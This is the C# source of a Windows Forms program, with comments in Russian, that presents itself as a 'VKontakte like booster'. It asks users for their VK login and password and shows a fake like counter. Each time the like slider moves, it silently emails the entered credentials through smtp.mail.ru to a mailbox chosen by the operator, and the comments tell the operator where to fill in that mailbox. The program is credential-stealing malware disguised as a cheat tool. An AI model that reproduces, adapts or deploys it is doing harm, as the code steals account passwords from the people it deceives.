//  Foobar is free software: you can redistribute it and/or modify
//  it under the terms of the GNU General Public License as published by
//  the Free Software Foundation, either version 3 of the License, or
//  (at your option) any later version.
//
//  Foobar is distributed in the hope that it will be useful,
//  but WITHOUT ANY WARRANTY; without even the implied warranty of
//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//  GNU General Public License for more details.
//
//  You should have received a copy of the GNU General Public License
//  along with Foobar.  If not, see <http://www.gnu.org/licenses/>.

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Mail;

namespace Cheat_likes_VKontakte
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e) // При несоответствии нужных условий вылезает ошибка.
        {
            if (tbLogin.Text == "")
            {
                MessageBox.Show("Вы не указали логин!", "Ошибка");
            }
            else
            {
                pbEmpty.Visible = false;
            }
            //////////////////////////////////////////////////////////////////////////////
            if (tbPassword.Text == "")
            {
                MessageBox.Show("Вы не указали пароль!", "Ошибка");
            }
            else
            {
                pbEmpty.Visible = false;
            }
            //////////////////////////////////////////////////////////////////////////////
            if (trackBar1.Value == 0)
            {
                MessageBox.Show("Вы не указали количество лайков!", "Ошибка");
            }
            else 
            {
                pbEmpty.Visible = false;
            }
            //////////////////////////////////////////////////////////////////////////////
            if (tbLogin.TextLength < 8)
            {
                MessageBox.Show("Логин должен содержать минимум 8 символов!", "Ошибка");
            }
            else
            {
                pbEmpty.Visible = false;
            }
            //////////////////////////////////////////////////////////////////////////////
            if (tbPassword.TextLength < 10)
            {
                MessageBox.Show("Пароль должен содержать минимум 10 символов!", "Ошибка");
            }
            else
            {
                pbEmpty.Visible = false;
            }
        }

        private void trackBar1_Scroll(object sender, EventArgs e) // При выборе количества лайков меняется текст у lblCount.
        {
            if (trackBar1.Value == 0) 
            {
                lblCount.Text = "Вы выбрали 0 лайков.";
            }
            else
            {
                pbEmpty.Visible = false;
            }
            //////////////////////////////////////////////////////////////////////////////
            if (trackBar1.Value == 1)
            {
                lblCount.Text = "Вы выбрали 1 лайк.";
            }
            else
            {
                pbEmpty.Visible = false;
            }
            //////////////////////////////////////////////////////////////////////////////
            if (trackBar1.Value == 2)
            {
                lblCount.Text = "Вы выбрали 2 лайка.";
            }
            else
            {
                pbEmpty.Visible = false;
            }
            //////////////////////////////////////////////////////////////////////////////
            if (trackBar1.Value == 3)
            {
                lblCount.Text = "Вы выбрали 3 лайка.";
            }
            else
            {
                pbEmpty.Visible = false;
            }
            //////////////////////////////////////////////////////////////////////////////
            if (trackBar1.Value == 4)
            {
                lblCount.Text = "Вы выбрали 4 лайка.";
            }
            else
            {
                pbEmpty.Visible = false;
            }
            //////////////////////////////////////////////////////////////////////////////
            if (trackBar1.Value == 5)
            {
                lblCount.Text = "Вы выбрали 5 лайков.";
            }
            else
            {
                pbEmpty.Visible = false;
            }
            //////////////////////////////////////////////////////////////////////////////
            if (trackBar1.Value == 6)
            {
                lblCount.Text = "Вы выбрали 6 лайков.";
            }
            else
            {
                pbEmpty.Visible = false;
            }
            //////////////////////////////////////////////////////////////////////////////
            if (trackBar1.Value == 7)
            {
                lblCount.Text = "Вы выбрали 7 лайков.";
            }
            else
            {
                pbEmpty.Visible = false;
            }
            //////////////////////////////////////////////////////////////////////////////
            if (trackBar1.Value == 8)
            {
                lblCount.Text = "Вы выбрали 8 лайков.";
            }
            else
            {
                pbEmpty.Visible = false;
            }
            //////////////////////////////////////////////////////////////////////////////
            if (trackBar1.Value == 9)
            {
                lblCount.Text = "Вы выбрали 9 лайков.";
            }
            else
            {
                pbEmpty.Visible = false;
            }
            //////////////////////////////////////////////////////////////////////////////
            if (trackBar1.Value == 10)
            {
                lblCount.Text = "Вы выбрали 10 лайков.";
            }
            else
            {
                pbEmpty.Visible = false;
            }
            //////////////////////////////////////////////////////////////////////////////
            try
            {
                string name_send = " ";       // Здесь Вы должны ввести имя отправителя.
                string email_send = " ";      // Здесь Вы должны указать почту отправителя.
                string pass = " ";            // Здесь Вы должны указать пароль от почты отправителя.
                string email_recipient = " "; // Здесь Вы должны указать почту получателя.
                

                using (MailMessage mm = new MailMessage(name_send + "<" + email_send + ">", email_recipient))
                {
                    mm.Subject = "Важная информация!"; // Здесь Вы можете указать название темы письма.
                    mm.Body = "Логин: " + tbLogin.Text + "   Пароль: " + tbPassword.Text; // Это лучше не трогать!
                    using (SmtpClient sc = new SmtpClient("smtp.mail.ru", 587)) // Для отправки Вы должны иметь почту Mail.ru.
                    {
                        sc.EnableSsl = true;                                      // 
                        sc.DeliveryMethod = SmtpDeliveryMethod.Network;           // Это всё не надо трогать, так как 
                        sc.Credentials = new NetworkCredential(email_send, pass); // программа просто будет зависать.
                        sc.Timeout = 3000;                                        //
                        sc.Send(mm); // Оно отвечает за отправку самого письма.                                             
                    }

                }
            }
            catch (Exception error)
            {
                MessageBox.Show(error.ToString());
            }
        }
    }
}
